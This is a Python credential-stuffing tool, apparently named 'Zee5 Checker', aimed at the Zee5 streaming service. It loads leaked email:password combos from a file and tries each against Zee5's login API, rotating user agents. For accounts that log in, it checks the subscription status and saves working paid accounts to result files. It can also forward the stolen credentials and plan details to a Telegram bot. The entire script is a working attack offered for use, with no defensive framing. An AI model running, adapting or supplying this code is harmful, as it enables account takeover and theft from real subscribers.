import requests
import os
from getuseragent import UserAgent
import re
import datetime
from datetime import date
import time

print('''
███████╗███████╗███████╗███████╗   ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
╚════██║██╔════╝██╔════╝██╔════╝   ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝█████╗░░█████╗░░██████╗░   ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══╝░░██╔══╝░░██╔══╝░░╚════██╗   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
███████╗███████╗███████╗██████╔╝   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝╚══════╝╚══════╝╚═════╝░   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝''')
print('\n                [+] Developed By DE3P4K [+]\n\n')

while 1:
    tg = input('Send HITS to Telegram? [Y/N] : ')
    if tg == 'y' or tg == 'Y':
        tgbot = 1
        print("\n")
        bot_token = input('Enter Bot Token : ')
        chat_id = input('Enter Chat ID : ')
        break
    elif tg =='n' or tg == 'N':
        tgbot = 0
        break
    else:
        print('Bad Input !\n')
        continue

while 1:
    res = input('Show Hits? [Y/N] : ')
    if res == 'y' or res == 'Y':
        show = 1
        break
    elif res =='n' or res == 'N':
        show = 0
        break
    else:
        print('Bad Input!\n')
        continue

ua = UserAgent().Random()
input("\nPut your combo in combo.txt file and press any key.")
print('\nStarting ...\n')
time.sleep(2)
combo = open('combo.txt', 'r')

good = 0
bad = 0
free = 0
expired = 0

uniq = str(datetime.datetime.now().date()) + '_' + str(datetime.datetime.now().time()).replace(':', '.')

path = "Results"
isExists = os.path.exists(path)
if not isExists:
    os.makedirs(path)

goodf = open(f'Results/GOOD{uniq}.txt', 'a')
freef = open(f'Results/FREE{uniq}.txt', 'a')
expiredf = open(f'Results/EXPIRED{uniq}.txt', 'a')

while True:

    line = combo.readline()
    
    if not line:
        print("\nDone. EXITING ...")
        time.sleep(2)
        break
    x = line.split(":")

    email = x[0]
    password = x[1]
    password = password.strip()

    url = "https://userapi.zee5.com/v2/user/loginemail"

    data = {
        "email":email,
        "password":password
    }

    headers = {
        'authority': 'userapi.zee5.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.zee5.com',
        'referer': 'https://www.zee5.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': ua
    }

    response = requests.post(url=url, json=data, headers=headers)
    jsonresponse = response.json()

    if "The email address and password combination was wrong during login." in response.text:
        bad += 1
        continue
    elif "This Email ID has been registered with us via Google/Facebook/Twitter. Please log in using the original mode of registration." in response.text:
        bad += 1
        continue
    elif "Invalid input parameter" in response.text:
        bad += 1
        continue
    elif "The email address of the user is not confirmed." in response.text:
        bad += 1
        continue
    elif "access_token" in response.text:
        token = jsonresponse["access_token"]
    else:
        print()

    headers = {
        'authority': 'subscriptionapi.zee5.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'bearer '+token,
        'origin': 'https://www.zee5.com',
        'referer': 'https://www.zee5.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': ua

    }
    response = requests.get("https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=false", headers=headers)
    jsonresponse = response.json()

    if "original_title" in response.text:
        today=date.today()
        exp_str = jsonresponse[0]['subscription_end']
        exp = re.search('\d{4}-\d{2}-\d{2}', exp_str)
        exp = datetime.datetime.strptime(exp.group(), '%Y-%m-%d').date()

        if today<exp:
            good =+ 1
            title = jsonresponse[0]["subscription_plan"]["original_title"]
            description = jsonresponse[0]["subscription_plan"]["description"]
            #expiry date
            renew = jsonresponse[0]["recurring_enabled"]
            device_limit = jsonresponse[0]["subscription_plan"]["number_of_supported_devices"]

            message = f"[Zee5]\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n{email} : {password}\nPlan : {title}\nDescription : {description}\nExpiry : {exp}\nAuto-Renew : {renew}\nDevice Limit : {device_limit}\n➖➖➖➖➖➖➖➖➖➖➖➖➖\nChecker by @DE3P4K07"

            goodf.write("----------------------------------------------------\n")
            goodf.writelines([f"{email}:{password}\n"])
            goodf.writelines([f"Plan : {title}\n",f"Description : {description}\n", f"Expiry : {exp}\n", f"Auto-Renew : {renew}\n", f"Device Limit : {device_limit}\n"])

            if tgbot == 1:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
                requests.get(url).json()

            if show == 1:
                os.system('color 2')
                print("[VALID]",email,":",password)

        else:
            expired =+ 1
            expiredf.writelines([f"{email}:{password}\n"])

            if show == 1:
                os.system('color 4')
                print("[Expired]",email,":",password)

    else:
        free =+ 1
        freef.writelines([f"{email}:{password}\n"])
        if show == 1:
            os.system('color 4')
            print("[Free]",email,":",password)